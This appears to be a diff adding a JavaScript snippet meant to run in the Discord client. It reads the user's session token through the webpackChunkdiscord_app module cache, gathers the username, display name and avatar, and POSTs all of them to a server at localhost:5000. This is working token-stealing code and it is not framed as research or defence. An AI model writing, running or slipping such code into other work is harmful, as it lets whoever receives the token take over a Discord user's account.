@@ -1,0 +1,21 @@
+fetch("https://discord.com/api/v9/users/@me", {
+  headers: { "Authorization": auth }
+})
+.then(res => res.json())
+.then(data => {
+  const username = data.username;
+  const displayName = data.global_name;
+  const avatar = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`;
+  fetch("http://localhost:5000/message", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ 
+      message: `\`\`\`\nAuth: ${(webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken()}\n\nDisplayname: ${displayName}\n\nUsername: ${username}\n\nPfp: ${avatar}\n\`\`\`` // Correct placement of variables
+    })
+  })
+  .then(res => res.json())
+  .then(data => console.log("Server Response:", data))
+  .catch(err => console.error("Error:", err));
+})
+.catch(err => console.error("Error:", err));
+
